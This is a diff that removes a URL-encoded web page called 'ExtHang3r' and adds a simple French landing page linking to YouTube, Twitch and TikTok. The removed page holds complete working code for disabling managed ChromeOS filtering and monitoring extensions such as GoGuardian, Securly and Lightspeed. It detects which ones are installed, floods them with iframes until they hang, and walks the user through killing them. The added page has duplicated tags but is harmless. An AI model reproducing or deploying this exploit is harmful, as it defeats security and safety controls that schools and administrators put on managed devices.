@@ -1,1 +1,79 @@
-<!DOCTYPE html>%0A<html lang%3D"en">%0A<head>%0A  <meta charset%3D"UTF-8">%0A  <meta name%3D"viewport" content%3D"width%3Ddevice-width%2C initial-scale%3D1.0">%0A  <title>ExtHang3r<%2Ftitle>%0A  <link rel%3D"shortcut icon" type%3D"image%2Fpng" href%3D"https%3A%2F%2Fraw.githubusercontent.com%2FBlobby-Boi%2FExtHang3r%2Fmain%2Ffavicon.png">%0A  <link rel%3D"stylesheet" href%3D"https%3A%2F%2Ffonts.googleapis.com%2Fcss2%3Ffamily%3DVarela%2BRound%26display%3Dswap">%0A  <style>%0A    body %7B%0A      font-family%3A 'Varela Round'%2C sans-serif%3B%0A      margin%3A 0%3B%0A      padding%3A 0%3B%0A      background-color%3A %23f8f9fa%3B%0A      color%3A %23333%3B%0A    %7D%0A    header %7B%0A      background-color%3A %23343a40%3B%0A      color%3A %23fff%3B%0A      padding%3A 10px 20px%3B%0A      text-align%3A center%3B%0A      display%3A flex%3B%0A      align-items%3A center%3B%0A      justify-content%3A center%3B%0A      box-shadow%3A 0 2px 5px rgba(0%2C 0%2C 0%2C 0.1)%3B%0A    %7D%0A    .logo %7B%0A      width%3A 50px%3B%0A      height%3A 50px%3B%0A      margin-right%3A 10px%3B%0A    %7D%0A    .container %7B%0A      max-width%3A 800px%3B%0A      margin%3A 150px auto 0 auto%3B%0A      padding%3A 20px%3B%0A      text-align%3A center%3B%0A      background%3A %23fff%3B%0A      box-shadow%3A 0 4px 8px rgba(0%2C 0%2C 0%2C 0.1)%3B%0A      border-radius%3A 8px%3B%0A    %7D%0A    select %7B%0A      font-family%3A 'Varela Round'%2C sans-serif%3B%0A      margin-bottom%3A 10px%3B%0A      padding%3A 10px%3B%0A      font-size%3A 16px%3B%0A      border%3A 1px solid %23ced4da%3B%0A      border-radius%3A 4px%3B%0A      width%3A 100%25%3B%0A    %7D%0A    button %7B%0A      font-family%3A 'Varela Round'%2C sans-serif%3B%0A      background-color%3A %23007bff%3B%0A      color%3A %23fff%3B%0A      border%3A none%3B%0A      padding%3A 10px 20px%3B%0A      font-size%3A 16px%3B%0A      cursor%3A pointer%3B%0A      border-radius%3A 5px%3B%0A      margin-top%3A 10px%3B%0A      transition%3A background-color 0.3s ease%3B%0A    %7D%0A    button%3Ahover %7B%0A      background-color%3A %230056b3%3B%0A    %7D%0A    .overlay %7B%0A      position%3A fixed%3B%0A      top%3A 0%3B%0A      left%3A 0%3B%0A      width%3A 100%25%3B%0A      height%3A 100%25%3B%0A      background-color%3A rgba(0%2C 0%2C 0%2C 0.7)%3B%0A      display%3A none%3B%0A      justify-content%3A center%3B%0A      align-items%3A center%3B%0A      z-index%3A 9999%3B%0A      color%3A %23fff%3B%0A      font-size%3A 24px%3B%0A      user-select%3A none%3B%0A      flex-direction%3A column%3B%0A    %7D%0A    .spinner %7B%0A      border%3A 6px solid rgba(255%2C 255%2C 255%2C 0.3)%3B%0A      border-top%3A 6px solid %23fff%3B%0A      border-radius%3A 50%25%3B%0A      width%3A 40px%3B%0A      height%3A 40px%3B%0A      animation%3A spin 1s linear infinite%3B%0A      margin-bottom%3A 20px%3B%0A    %7D%0A    %40keyframes spin %7B%0A      0%25 %7B transform%3A rotate(0deg)%3B %7D%0A      100%25 %7B transform%3A rotate(360deg)%3B %7D%0A    %7D%0A    %23killExtensionText %7B%0A      display%3A none%3B%0A      margin-top%3A 20px%3B%0A      color%3A %23333%3B%0A      font-size%3A 18px%3B%0A      text-align%3A center%3B%0A      background%3A %23e9ecef%3B%0A      padding%3A 20px%3B%0A      border-radius%3A 8px%3B%0A      box-shadow%3A 0 4px 8px rgba(0%2C 0%2C 0%2C 0.1)%3B%0A    %7D%0A   %09 %23killButton %7B%0A%09  display%3A none%3B%0A%09  background-color%3A %23dc3545%3B%0A%09  color%3A %23fff%3B%0A%09  border%3A none%3B%0A%09  padding%3A 10px 20px%3B%0A%09  font-size%3A 16px%3B%0A%09  cursor%3A pointer%3B%0A%09  border-radius%3A 5px%3B%0A %09  transition%3A background-color 0.3s ease%3B%0A%09%7D%0A%0A%09%23killButton%3Ahover %7B%0A%09  background-color%3A %239c1c28%3B%0A%09%7D%0A    footer %7B%0A      background-color%3A %23343a40%3B%0A      color%3A %23fff%3B%0A      text-align%3A center%3B%0A      padding%3A 10px%3B%0A      position%3A fixed%3B%0A      bottom%3A 0%3B%0A      width%3A 100%25%3B%0A    %7D%0A    footer a %7B%0A      color%3A %23007bff%3B%0A      text-decoration%3A none%3B%0A    %7D%0A    footer a%3Ahover %7B%0A      text-decoration%3A underline%3B%0A    %7D%0A  <%2Fstyle>%0A<%2Fhead>%0A<body>%0A%0A<header>%0A  <img src%3D"https%3A%2F%2Fblobby-boi.github.io%2FBlobbypassXSS%2Ffavicon.png" alt%3D"Logo" class%3D"logo">%0A  <h1>ExtHang3r<%2Fh1>%0A<%2Fheader>%0A%0A<div class%3D"container">%0A  <p>ExtHang3r is an exploit that allows ChromeOS users to kill managed extensions after the LTMEAT patch. It remains unpatched in all new ChromeOS versions as of November 2024.<%2Fp>%0A  <label for%3D"iframeSelect" id%3D"labelForIframeSelect">Select extension%3A<%2Flabel>%0A  <select id%3D"iframeSelect">%0A  <%2Fselect>%0A  <button onclick%3D"warning()%3B" id%3D"hangButton">Hang Extension!<%2Fbutton>%0A  <button id%3D"killButton" onclick%3D"openExtensionPopup()%3B">Kill Extension!<%2Fbutton>%0A<%2Fdiv>%0A%0A<div class%3D"overlay" id%3D"overlay">%0A  <div class%3D"spinner"><%2Fdiv>%0A  Hanging... (This will take about 1 minute)%0A<%2Fdiv>%0A<div id%3D"killExtensionText"><%2Fdiv>%0A%0A<footer>%0A  <p>Made by <a href%3D"https%3A%2F%2Fgithub.com%2FBlobby-Boi%2F">Blobby Boi<%2Fa><%2Fp>%0A<%2Ffooter>%0A%0A<script>%0A  async function checkExtensionURL(url) %7B%0A    try %7B%0A      const response %3D await fetch(url)%3B%0A      if (response.ok) %7B%0A        return true%3B%0A      %7D else %7B%0A        return false%3B%0A      %7D%0A    %7D catch (error) %7B%0A      return false%3B%0A    %7D%0A  %7D%0A%0A  async function populateSelectOptions() %7B%0A    const selectElement %3D document.getElementById("iframeSelect")%3B%0A    const extensions %3D %7B%0A      "Securly"%3A "chrome-extension%3A%2F%2Fjoflmkccibkooplaeoinecjbmdebglab%2Ffonts%2FMetropolis.css"%2C%0A      "Securly (old)"%3A "chrome-extension%3A%2F%2Fiheobagjkfklnlikgihanlhcddjoihkg%2Ffonts%2FMetropolis.css"%2C%0A      "GoGuardian"%3A "chrome-extension%3A%2F%2Fhaldlgldplgnggkjaafhelgiaglafanh%2Fyoutube_injection.js"%2C%0A      "LANSchool"%3A "chrome-extension%3A%2F%2Fbaleiojnjpgeojohhhfbichcodgljmnj%2Fblocked.html"%2C%0A      "Linewize"%3A "chrome-extension%3A%2F%2Fddfbkhpmcdbciejenfcolaaiebnjcbfc%2Fbackground%2Fassets%2Fpages%2Fdefault-blocked.html"%2C%0A      "Blocksi"%3A "chrome-extension%3A%2F%2Fghlpmldmjjhmdgmneoaibbegkjjbonbk%2Fpages%2FblockPage.html"%2C%0A      "FortiGuard"%3A "chrome-extension%3A%2F%2Figbgpehnbmhgdgjbhkkpedommgmfbeao%2Fyoutube_injection.js"%2C%0A      "Cisco Umbrella"%3A "chrome-extension%3A%2F%2Fjcdhmojfecjfmbdpchihbeilohgnbdci%2Fblocked.html"%2C%0A      "ContentKeeper"%3A "chrome-extension%3A%2F%2Fjdogphakondfdmcanpapfahkdomaicfa%2Fimg%2Fckauth19x.png"%2C%0A      "CK-Authenticator G3"%3A "chrome-extension%3A%2F%2Fodoanpnonilogofggaohhkdkdgbhdljp%2Fimg%2Fckauth19x.png"%2C%0A      "Securly Classroom"%3A "chrome-extension%3A%2F%2Fjfbecfmiegcjddenjhlbhlikcbfmnafd%2Fnotfound.html"%2C%0A      "Hapara"%3A "chrome-extension%3A%2F%2Fkbohafcopfpigkjdimdcdgenlhkmhbnc%2Fblocked.html"%2C%0A      "Hapara (new ID)"%3A "chrome-extension%3A%2F%2Faceopacgaepdcelohobicpffbbejnfac%2Fblocked.html"%2C%0A      "iboss"%3A "chrome-extension%3A%2F%2Fkmffehbidlalibfeklaefnckpidbodff%2Frestricted.html"%2C%0A      "Lightspeed Digital Insight Agent"%3A "chrome-extension%3A%2F%2Fnjdniclgegijdcdliklgieicanpmcngj%2Fimages%2Fdigital-insight(128x128).png"%2C%0A      "Lightspeed Filter Agent"%3A "chrome-extension%3A%2F%2Fadkcpkpghahmbopkjchobieckeoaoeem%2Ficon-128.png"%2C%0A      "Lightspeed Classroom"%3A "chrome-extension%3A%2F%2Fkkbmdgjggcdajckdlbngdjonpchpaiea%2Fassets%2Ficon-classroom-128.png"%2C%0A      "InterCLASS Filtering Service"%3A "chrome-extension%3A%2F%2Fjbddgjglgkkneonnineaohdhabjbgopi%2Fpages%2Fmessage-page.html"%2C%0A      "InterSafe GatewayConnection Agent"%3A "chrome-extension%3A%2F%2Fecjoghccnjlodjlmkgmnbnkdcbnjgden%2Fresources%2Foptions.js"%2C%0A      "LoiLo Web Filters"%3A "chrome-extension%3A%2F%2Fpabjlbjcgldndnpjnokjakbdofjgnfia%2Fimage%2Fallow_icon%2Fshield_green_128x128.png"%2C%0A      "Gopher Buddy"%3A "chrome-extension%3A%2F%2Fcgbbbjmgdpnifijconhamggjehlamcif%2Fimages%2Fgopher-buddy_128x128_color.png"%2C%0A      "LanSchool Web Helper"%3A "chrome-extension%3A%2F%2Fhonjcnefekfnompampcpmcdadibmjhlk%2Fblocked.html"%2C%0A      "IMTLazarus"%3A "chrome-extension%3A%2F%2Fcgigopjakkeclhggchgnhmpmhghcbnaf%2Fmodels%2Fmodel.json"%2C%0A      "Impero Backdrop"%3A "chrome-extension%3A%2F%2Fjjpmjccpemllnmgiaojaocgnakpmfgjg%2Flicenses.html"%2C%0A      "Mobile Guardian"%3A "chrome-extension%3A%2F%2Ffgmafhdohjkdhfaacgbgclmfgkgokgmb%2Fblock.html"%2C%0A      "NetSupport School Student"%3A "chrome-extension%3A%2F%2Fgcjpefhffmcgplgklffgbebganmhffje%2F_locales%2Flt%2Fmessages.json"%2C%0A    %7D%3B%0A    %0A    let hasSupportedExtensions %3D false%3B%0A%0A    for (const %5Bname%2C url%5D of Object.entries(extensions)) %7B%0A      if (await checkExtensionURL(url)) %7B%0A        const option %3D document.createElement("option")%3B%0A        option.value %3D url%3B%0A        option.textContent %3D name%3B%0A        selectElement.appendChild(option)%3B%0A        hasSupportedExtensions %3D true%3B%0A      %7D%0A    %7D%0A    %0A    if (!hasSupportedExtensions) %7B%0A      const option %3D document.createElement("option")%3B%0A      option.value %3D ""%3B%0A      option.textContent %3D "No supported extensions installed"%3B%0A      selectElement.appendChild(option)%3B%0A      document.getElementById("hangButton").style.display %3D "none"%3B%0A    %7D%0A  %7D%0A%0A  populateSelectOptions()%3B%0A  %0A  function replaceIframes(container%2C iframeSrc) %7B%0A    for (var i %3D 0%3B i < 1000%3B i%2B%2B) %7B%0A      var iframe %3D document.createElement('iframe')%3B%0A      iframe.src %3D iframeSrc%3B%0A      iframe.style.width %3D '100%25'%3B%0A      iframe.style.height %3D '100px'%3B%0A      container.appendChild(iframe)%3B%0A    %7D%0A    setTimeout(function() %7B%0A      while (container.firstChild) %7B%0A        container.removeChild(container.firstChild)%3B%0A      %7D%0A      replaceIframes(container%2C iframeSrc)%3B%0A    %7D%2C 5)%3B%0A  %7D%0A%0A  function warning() %7B%0A    var overlay %3D document.getElementById("overlay")%3B%0A    overlay.style.display %3D "flex"%3B%0A    var iframeSelect %3D document.getElementById("iframeSelect")%3B%0A    var selectedOption %3D iframeSelect.options%5BiframeSelect.selectedIndex%5D.text%3B%0A    var selectedSrc %3D iframeSelect.value%3B%0A    var popup %3D window.open(""%2C "PopupWindow"%2C "width%3D100%2Cheight%3D100")%3B%0A    var popupDocument %3D popup.document%3B%0A    var popupBody %3D popupDocument.body%3B%0A    var iframeContainer %3D popupDocument.createElement('div')%3B%0A    iframeContainer.id %3D 'iframeContainer'%3B%0A    popupBody.appendChild(iframeContainer)%3B%0A    replaceIframes(iframeContainer%2C selectedSrc)%3B%0A    setTimeout(function() %7B%0A      popup.close()%3B%0A      var extensionId %3D selectedSrc.substring(selectedSrc.indexOf("%2F%2F") %2B 2%2C selectedSrc.indexOf("%2F"%2C selectedSrc.indexOf("%2F%2F") %2B 2))%3B%0A      var extensionURL %3D "chrome-extension%3A%2F%2F" %2B extensionId%3B%0A      var killExtensionText %3D document.getElementById("killExtensionText")%3B%0A      killExtensionText.innerHTML %3D "Now that the extension <strong>" %2B selectedOption %2B "<%2Fstrong> has been hanged%2C press the button above."%3B%0A      setTimeout(function() %7B%0A        overlay.style.display %3D "none"%3B%0A        killExtensionText.style.display %3D "block"%3B%0A        document.getElementById("killButton").style.display %3D "inline-block"%3B%0A        document.getElementById("hangButton").style.display %3D "none"%3B%0A%09document.getElementById("iframeSelect").style.display %3D "none"%3B%0A%09document.getElementById("labelForIframeSelect").style.display %3D "none"%3B%0A        document.getElementById("killButton").setAttribute("data-url"%2C selectedSrc)%3B%0A      %7D%2C 10000)%3B%0A    %7D%2C 5000)%3B%0A  %7D%0A%0A  function openExtensionPopup() %7B%0A    var selectedSrc %3D document.getElementById("killButton").getAttribute("data-url")%3B%0A    var extensionId %3D selectedSrc.substring(selectedSrc.indexOf("%2F%2F") %2B 2%2C selectedSrc.indexOf("%2F"%2C selectedSrc.indexOf("%2F%2F") %2B 2))%3B%0A    var killExtensionText %3D document.getElementById("killExtensionText")%3B%0A    document.getElementById("killButton").style.display %3D "none"%3B%0A    killExtensionText.innerHTML %3D "Make sure to keep this tab open. Then in a new tab open <strong>chrome%3A%2F%2Fextensions%2F%3Fid%3D" %2B extensionId %2B "<%2Fstrong> Flip the switch called allow access to file URLs twice. The extension was successfully killed! Now you can close that tab as well as this one. If you want to restore the extension%2C flip the allow access to file URLs switch again."%3B%0A    window.location.href %3D selectedSrc%3B%0A  %7D%0A<%2Fscript>%0A<%2Fbody>%0A<%2Fhtml>
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Main Page</title>
+    <title>Page Principale</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #74ebd5, #acb6e5); /* Dégradé de fond coloré */
+            margin: 0;
+            text-align: center;
+        }
+        h1 {
+            color: #fff; /* Couleur du titre */
+            font-size: 36px; /* Taille du titre */
+            margin-bottom: 20px; /* Espace sous le titre */
+            margin-bottom: 30px; /* Espace sous le titre */
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3); /* Ombre pour le texte */
+        }
+        .button-container {
+            display: flex;
+            gap: 30px; /* Espace entre les boutons */
+            justify-content: center; /* Centre les boutons horizontalement */
+        }
+        .button {
+            padding: 15px 25px; /* Padding pour un bouton plus grand */
+            border: none;
+            border-radius: 10px; /* Coins arrondis */
+            cursor: pointer;
+            text-align: center;
+            font-size: 18px; /* Taille de la police */
+            text-decoration: none; /* Supprime le soulignement des liens */
+            display: flex;
+            align-items: center;
+            justify-content: center; /* Centre le texte */
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3); /* Ombre portée */
+            transition: background-color 0.3s, transform 0.3s, box-shadow 0.3s; /* Transition */
+            width: 150px; /* Largeur fixe pour les boutons */
+            font-weight: bold; /* Gras pour le texte */
+        }
+        .button-youtube {
+            background-color: #FF0000; /* Couleur YouTube */
+            color: white;
+        }
+        .button-twitch {
+            background-color: #9146FF; /* Couleur Twitch */
+            color: white;
+        }
+        .button-tiktok {
+            background-color: #69C9D0; /* Couleur TikTok */
+            color: white;
+        }
+        .button:hover {
+            transform: translateY(-5px); /* Élévation lors du survol */
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4); /* Ombre plus prononcée */
+        }
+        .button:active {
+            transform: translateY(0); /* Rétablit la position lors du clic */
+        }
+    </style>
+</head>
+<body>
+
+<h1>Bienvenue Maki</h1>
+<div class="button-container">
+    <a href="https://www.youtube.com" class="button button-youtube">YouTube</a>
+    <a href="https://www.twitch.tv" class="button button-twitch">Twitch</a>
+    <a href="https://www.tiktok.com" class="button button-tiktok">TikTok</a>
+</div>
+
+</body>
+</html>
+</html>
